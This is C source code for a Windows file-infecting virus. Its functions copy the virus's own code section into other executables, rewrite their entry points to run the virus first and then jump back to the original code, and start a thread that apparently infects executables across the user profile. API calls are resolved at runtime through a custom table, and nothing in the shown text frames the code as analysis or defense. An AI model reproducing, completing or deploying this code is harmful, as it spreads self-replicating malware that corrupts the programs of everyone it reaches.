#include "everything.h"

#include "shared.h"

void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, const PDATA data, LPDWORD new_file_size);

int main();

void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, const PDATA data, LPDWORD new_file_size)
{
    PVOID section_data = NULL;
    DWORD section_size = 0;
    DWORD virus_section_va = 0;
    PIMAGE_SECTION_HEADER virus_section = GetCurrentVirusSection(data->this_file_base_address);
    DWORD virus_va_in_target;
    DWORD target_entry_point;

    target_entry_point = GetEntryPoint(file_data);

    virus_section_va = virus_section->VirtualAddress;
    section_size = virus_section->SizeOfRawData;
    section_data = data->iat->fnVirtualAlloc(
        NULL, 
        section_size, 
        MEM_COMMIT|MEM_RESERVE,
        PAGE_READWRITE
    );

    MemCopy(section_data, (PUCHAR)data->this_file_base_address + virus_section_va, section_size);

    PIMAGE_SECTION_HEADER virus_section_in_target = AddVirusSection(file_data, &file_size, section_data, section_size, data);

    virus_va_in_target = virus_section_in_target->VirtualAddress;

    if (Is64BitExecutable(file_data))
    {
        DWORD entry_point_64bit = 0x28F0;
        SetEntryPoint(file_data, virus_va_in_target + entry_point_64bit);
        *(DWORD*)((PUCHAR*)file_data + 0x2945) = target_entry_point - (virus_va_in_target + 0x2949) ;
    }
    else
    {
        DWORD entry_point_32bit = 0xca0;
        SetEntryPoint(file_data, virus_va_in_target + entry_point_32bit);
        *(DWORD*)((PUCHAR*)file_data + 0xcdc) = target_entry_point - (virus_va_in_target + 0xce0);
    }

    data->iat->fnVirtualFree(
        section_data,
        0, 
        MEM_RELEASE
    );

    *(DWORD*)new_file_size = file_size + section_size;
    return;
}

void WINAPI InfectFile(PSTR file_name, const PDATA data)
{
    HANDLE handle_file;
    HANDLE handle_mapped_file;
    PVOID mapped_file_address;
    ULONG file_size, new_file_size, bytes_read;
    PVOID file_data = NULL;
    DWORD number_of_bytes_written = 0;

    handle_file = data->iat->fnCreateFileA(
        file_name, 
        GENERIC_READ|GENERIC_WRITE, 
        FILE_SHARE_READ|FILE_SHARE_WRITE, 
        NULL,
        OPEN_EXISTING,
        0,NULL
    );

    if (handle_file == INVALID_HANDLE_VALUE)
    {
        goto END_FUNCTION;
    }

    file_size = data->iat->fnGetFileSize(handle_file, NULL);
    new_file_size = file_size;
    
    file_data = data->iat->fnVirtualAlloc(
        NULL, 
        file_size + 0x1000000, 
        MEM_COMMIT|MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (!file_data)
    {
        goto END_FUNCTION;
    }

    if (!data->iat->fnReadFile(handle_file, file_data, file_size, &bytes_read, NULL))
    {
        goto END_FUNCTION;
    }

    if (!IsValidExecutable(file_data) || IsVirusExistedInFile(file_data))
    {
        goto END_FUNCTION;
    }

    AddVirusToFile(file_data, file_size, data, &new_file_size);

    handle_mapped_file = data->iat->fnCreateFileMappingA(handle_file, NULL, PAGE_READWRITE, 0, new_file_size, NULL);
    if (!handle_mapped_file)
    {
        goto END_FUNCTION;
    }

    mapped_file_address = data->iat->fnMapViewOfFile(handle_mapped_file, FILE_MAP_ALL_ACCESS, 0, 0, 0);

    MemCopy(mapped_file_address, file_data, new_file_size);
    
    data->iat->fnFlushViewOfFile(mapped_file_address,0);
    data->iat->fnUnmapViewOfFile(mapped_file_address);
    data->iat->fnCloseHandle(handle_mapped_file);

    END_FUNCTION:
    if (handle_file != NULL)
    {
        data->iat->fnCloseHandle(handle_file);
    }
    if (file_data != NULL)
    {
        data->iat->fnVirtualFree(file_data, 0, MEM_RELEASE);
    }
    return;
} 

void EmptyFunction()
{
    return;
}

int main()
{
    IAT iat;
    DATA data;
    data.iat = &iat;
    data.end_virus = 0;
    HANDLE handle_thread;
    GetFunctionAddresses(&data);    
    handle_thread = data.iat->fnCreateThread(NULL, 0, InfectUserProfile, (PVOID)(&data), 0, NULL);
    EmptyFunction();
    data.end_virus = 1;
    data.iat->fnWaitForSingleObject(handle_thread, INFINITE);
    return 0;
}

